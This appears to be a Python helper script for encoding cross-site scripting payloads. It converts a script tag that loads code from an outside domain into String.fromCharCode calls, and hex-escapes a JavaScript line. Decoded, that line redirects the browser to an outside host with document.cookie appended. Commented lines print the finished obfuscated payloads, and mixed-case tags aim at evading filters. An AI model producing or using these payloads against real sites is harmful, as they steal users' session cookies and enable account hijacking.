a= "<sCRiPt sRC=//hk.sb/y7xx></sCrIpT>"
res = ''
res2 = ''
for i in a:
  tmp = ord(i)
  res += str(tmp)
  res+=","
  res2 +=f"document.write(String.fromCharCode({str(tmp)}));"
# print(res)
# 60,115,67,82,105,80,116,32,115,82,67,61,47,47,104,107,46,115,98,47,121,55,120,120,62,60,47,115,67,114,73,112,84,62
# document.write(String.fromCharCode(60,115,67,82,105,80,116,32,115,82,67,61,47,47,104,107,46,115,98,47,121,55,120,120,62,60,47,115,67,114,73,112,84,62));
# print(res2)

# a = "646f63756d656e742e777269746528537472696e672e66726f6d43686172436f64652836302c3131352c36372c38322c3130352c38302c3131362c33322c3131352c38322c36372c36312c34372c34372c3130342c3130372c34362c3131352c39382c34372c3132312c35352c3132302c3132302c36322c36302c34372c3131352c36372c3131342c37332c3131322c38342c363229293b"
a = '646f63756d656e742e6c6f636174696f6e3d276d6934353137393637362e7a6963702e7669703a33313039352f272b646f63756d656e742e636f6f6b69653b'
z = 0
res = ''
for i in a:
  if z ==2:
    z=0
  if z ==0:
    res+=r"\x"
  res += i
  z+=1
print(res)


# document.write(String.fromCharCode(60));document.write(String.fromCharCode(115));document.write(String.fromCharCode(67));document.write(String.fromCharCode(82));document.write(String.fromCharCode(105));document.write(String.fromCharCode(80));document.write(String.fromCharCode(116));document.write(String.fromCharCode(32));document.write(String.fromCharCode(115));document.write(String.fromCharCode(82));document.write(String.fromCharCode(67));document.write(String.fromCharCode(61));document.write(String.fromCharCode(47));document.write(String.fromCharCode(47));document.write(String.fromCharCode(104));document.write(String.fromCharCode(107));document.write(String.fromCharCode(46));document.write(String.fromCharCode(115));document.write(String.fromCharCode(98));document.write(String.fromCharCode(47));document.write(String.fromCharCode(121));document.write(String.fromCharCode(55));document.write(String.fromCharCode(120));document.write(String.fromCharCode(120));document.write(String.fromCharCode(62));document.write(String.fromCharCode(60));document.write(String.fromCharCode(47));document.write(String.fromCharCode(115));document.write(String.fromCharCode(67));document.write(String.fromCharCode(114));document.write(String.fromCharCode(73));document.write(String.fromCharCode(112));document.write(String.fromCharCode(84));document.write(String.fromCharCode(62));
# \x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x77\x72\x69\x74\x65\x28\x53\x74\x72\x69\x6e\x67\x2e\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65\x28\x36\x30\x2c\x31\x31\x35\x2c\x36\x37\x2c\x38\x32\x2c\x31\x30\x35\x2c\x38\x30\x2c\x31\x31\x36\x2c\x33\x32\x2c\x31\x31\x35\x2c\x38\x32\x2c\x36\x37\x2c\x36\x31\x2c\x34\x37\x2c\x34\x37\x2c\x31\x30\x34\x2c\x31\x30\x37\x2c\x34\x36\x2c\x31\x31\x35\x2c\x39\x38\x2c\x34\x37\x2c\x31\x32\x31\x2c\x35\x35\x2c\x31\x32\x30\x2c\x31\x32\x30\x2c\x36\x32\x2c\x36\x30\x2c\x34\x37\x2c\x31\x31\x35\x2c\x36\x37\x2c\x31\x31\x34\x2c\x37\x33\x2c\x31\x31\x32\x2c\x38\x34\x2c\x36\x32\x29\x29\x3b